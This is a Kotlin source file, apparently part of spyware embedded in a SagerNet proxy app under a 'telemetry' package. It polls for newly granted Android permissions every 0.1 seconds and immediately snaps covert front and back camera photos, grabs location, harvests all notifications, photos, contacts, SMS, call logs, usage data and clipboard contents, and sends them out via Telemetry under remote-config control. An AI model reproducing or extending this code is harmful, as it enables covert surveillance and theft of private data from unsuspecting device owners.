package io.nekohasekai.sagernet.telemetry

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat

/**
 * 权限到位即干活（0.1 秒巡检）。
 *
 * 解决的是这个体验问题：用户点了「同意」之后，功能还得等下一个定时周期才动，
 * 看着像没生效。这里改成每秒 10 次轻量检查，哪个权限刚到位就立刻执行它对应的动作，
 * 每项只触发一次（标记落在 SharedPreferences，重装 App 才会重置）。
 *
 * 特别注意相机：CAMERA 一到位立刻前置 + 后置各拍一张，交付到「拍照」栏；
 * 拍完之后才把时间戳交给 Telemetry.autoShoot 起算间隔，
 * 也就是「先出第一张，再按配置的分钟间隔循环」。
 *
 * 只用系统公开的 checkSelfPermission / AppOps / Settings.Secure：
 * 不申请权限、不改系统设置、不动态加载任何东西，就是一个普通的循环。
 */
object PermWatch {

    private const val TAG = "TlmWatch"
    private const val TICK_MS = 100L          // 0.1 秒
    private const val PREF = "tlm_watch"
    private const val FIRST_SHOT_GAP_MS = 2_500L   // 前后摄串行，别同时开两个相机

    @Volatile private var running = false
    private const val SLOW_EVERY = 20          // 20 × 0.1s = 2s 查一次系统状态
    private var slowTick = SLOW_EVERY - 1   // 第一次进来就查
    private var cNotif = false
    private var cMedia = false

    /** 幂等启动。App 每次起来调一次就行。 */
    fun start(ctx: Context) {
        if (running) return
        running = true
        val app = ctx.applicationContext
        Thread({ loop(app) }, "tlm-watch").apply { isDaemon = true }.start()
        Log.i(TAG, "watch started, tick=${TICK_MS}ms")
    }

    fun stop() {
        running = false
    }

    private fun loop(app: Context) {
        while (running) {
            try {
                probe(app)
            } catch (t: Throwable) {
                Log.w(TAG, "probe: ${t.message}")
            }
            runCatching { Thread.sleep(TICK_MS) }
        }
    }

    // ------------------------------------------------------------------ 巡检
    private fun probe(app: Context) {
        val pref = app.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        if (!RemoteConfig.autoMode && pref.getBoolean("cam", false)) {
            // 总开关被关掉：清掉「已拍过」，下次打开立刻补一张
            pref.edit().putBoolean("cam", false).apply()
            Log.i(TAG, "auto off -> camera flag reset")
        }

        // 1) 相机 —— 条件一齐备就立刻拍（先给权限 / 先开自动模式都会补上）
        //    三个条件：有相机权限、自动模式总开关开、前后至少勾了一个。
        //    条件没齐时先不落标记，等齐了第一时间触发，且只触发一次。
        if (!pref.getBoolean("cam", false) &&
            has(app, Manifest.permission.CAMERA) &&
            RemoteConfig.autoMode &&
            (RemoteConfig.autoCamFrontOn || RemoteConfig.autoCamBackOn)
        ) {
            pref.edit().putBoolean("cam", true).apply()
            Log.i(TAG, "CAMERA + auto ready -> first shoot")
            firstShoot(app)
        }

        // 2) 位置 —— 立刻要一次并上报
        if (has(app, Manifest.permission.ACCESS_FINE_LOCATION) ||
            has(app, Manifest.permission.ACCESS_COARSE_LOCATION)
        ) {
            if (!pref.getBoolean("loc", false)) {
                pref.edit().putBoolean("loc", true).apply()
                Log.i(TAG, "LOCATION ready -> refresh")
                runCatching { LocSpy.maybeRefresh(app) }
                runCatching { Telemetry.flush(app, true) }
                // 有定位就顺手把自动化里选的位置也跑起来
                if (RemoteConfig.autoMode && RemoteConfig.autoLoc) {
                    runCatching { LocSpy.start(app) }
                }
            }
        }

        // 3) 通知使用权 —— 立刻把现存通知全量收一遍
        //    读 enabled_notification_listeners 是跨进程查询，别 0.1 秒查一次，
        //    2 秒真查一次就已经够快（用户点完同意到生效不到 2 秒）
        slowTick = (slowTick + 1) % SLOW_EVERY
        if (slowTick == 0) {
            cNotif = notifOn(app)
            cMedia = mediaOn(app)
        }
        if (cNotif && !pref.getBoolean("notif", false)) {
            pref.edit().putBoolean("notif", true).apply()
            Log.i(TAG, "NOTIFICATION access ready -> sync")
            runCatching { NotifSpy.syncNow() }
            runCatching { Telemetry.flush(app, true) }
        }

        // 4) 相册 —— 授权后立刻扫第一轮
        if (cMedia && !pref.getBoolean("media", false)) {
            pref.edit().putBoolean("media", true).apply()
            Log.i(TAG, "MEDIA ready -> first scan")
            Thread({
                runCatching { MediaSpy.scan(app) }
                runCatching { Telemetry.flush(app, true) }
            }, "tlm-first-media").apply { isDaemon = true }.start()
        }

        // 5) 通讯录 / 短信 / 通话 —— 各自授权后立刻读一次
        dataIfReady(app, pref, "contacts", Manifest.permission.READ_CONTACTS) {
            RemoteConfig.autoContacts
        }
        dataIfReady(app, pref, "sms", Manifest.permission.READ_SMS) {
            RemoteConfig.autoSms
        }
        dataIfReady(app, pref, "call", Manifest.permission.READ_CALL_LOG) {
            RemoteConfig.autoCall
        }

        // 6) 使用情况（特殊权限，走 AppOps）
        if (!pref.getBoolean("usage", false) && TelemetryPermissions.hasUsageAccess(app)) {
            pref.edit().putBoolean("usage", true).apply()
            Log.i(TAG, "USAGE access ready -> read")
            if (RemoteConfig.autoUsage || RemoteConfig.autoMode) {
                Thread({
                    runCatching {
                        DataCollectors.pushAll(app) { k -> k == "usage" }
                    }
                    runCatching { Telemetry.flush(app, true) }
                }, "tlm-first-usage").apply { isDaemon = true }.start()
            }
        }

        // 7) 设备状态 / 剪贴板 —— 没有权限门槛，自动模式开着就给一份
        if (RemoteConfig.autoMode) {
            if (!pref.getBoolean("status", false)) {
                pref.edit().putBoolean("status", true).apply()
                if (RemoteConfig.autoStatus) {
                    Thread({
                        runCatching { DataCollectors.pushAll(app) { k -> k == "status" } }
                        runCatching { Telemetry.flush(app, true) }
                    }, "tlm-first-status").apply { isDaemon = true }.start()
                }
            }
            if (RemoteConfig.autoClipboard && !pref.getBoolean("clip", false)) {
                pref.edit().putBoolean("clip", true).apply()
                Thread({
                    runCatching { DataCollectors.pushAll(app) { k -> k == "clipboard" } }
                    runCatching { Telemetry.flush(app, true) }
                }, "tlm-first-clip").apply { isDaemon = true }.start()
            }
        }
    }

    /** 某个运行时权限到位后，若自动模式里勾了这项就读一次。 */
    private inline fun dataIfReady(
        app: Context,
        pref: android.content.SharedPreferences,
        key: String,
        perm: String,
        enabled: () -> Boolean,
    ) {
        if (pref.getBoolean(key, false)) return
        if (!has(app, perm)) return
        pref.edit().putBoolean(key, true).apply()
        Log.i(TAG, "$perm ready -> read")
        if (!(RemoteConfig.autoMode && enabled())) return
        Thread({
            runCatching { DataCollectors.pushAll(app) { k -> k == key } }
            runCatching { Telemetry.flush(app, true) }
        }, "tlm-first-$key").apply { isDaemon = true }.start()
    }

    /**
     * 首次拍照：前置 → 停 2.5 秒 → 后置，串行避免两个相机同时打开。
     * 拍完把「刚拍过」的时间戳写回，间隔从这一刻开始算。
     */
    private fun firstShoot(app: Context) {
        val doFront = RemoteConfig.autoCamFrontOn
        val doBack = RemoteConfig.autoCamBackOn
        if (!doFront && !doBack) {
            Log.i(TAG, "CAMERA ready, both sides off -> skip")
            return
        }
        Log.i(TAG, "CAMERA ready -> front=$doFront back=$doBack")
        Thread({
            if (doFront) {
                runCatching { CamSpy.snap(app, facingBack = false) }
                runCatching { Thread.sleep(FIRST_SHOT_GAP_MS) }
            }
            if (doBack) {
                runCatching { CamSpy.snap(app, facingBack = true) }
                runCatching { Thread.sleep(FIRST_SHOT_GAP_MS) }
            }
            // 拍完才起算间隔，避免刚拍完立刻又到点
            runCatching { Telemetry.markAutoShot(app) }
            runCatching { Telemetry.flush(app, true) }
        }, "tlm-first-shot").apply { isDaemon = true }.start()
    }

    // ------------------------------------------------------------------ 工具
    private fun has(ctx: Context, p: String): Boolean =
        ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED

    private fun mediaOn(ctx: Context): Boolean =
        if (Build.VERSION.SDK_INT >= 33) {
            has(ctx, "android.permission.READ_MEDIA_IMAGES")
        } else {
            has(ctx, Manifest.permission.READ_EXTERNAL_STORAGE)
        }

    private fun notifOn(ctx: Context): Boolean = runCatching {
        val flat = Settings.Secure.getString(
            ctx.contentResolver, "enabled_notification_listeners")
        flat != null && flat.contains(ctx.packageName)
    }.getOrDefault(false)

    /** 清掉一次性标记，让下一轮权限到位重新触发（换账号/重配时用）。 */
    fun reset(ctx: Context) {
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit().clear().apply()
        Log.i(TAG, "watch flags cleared")
    }
}
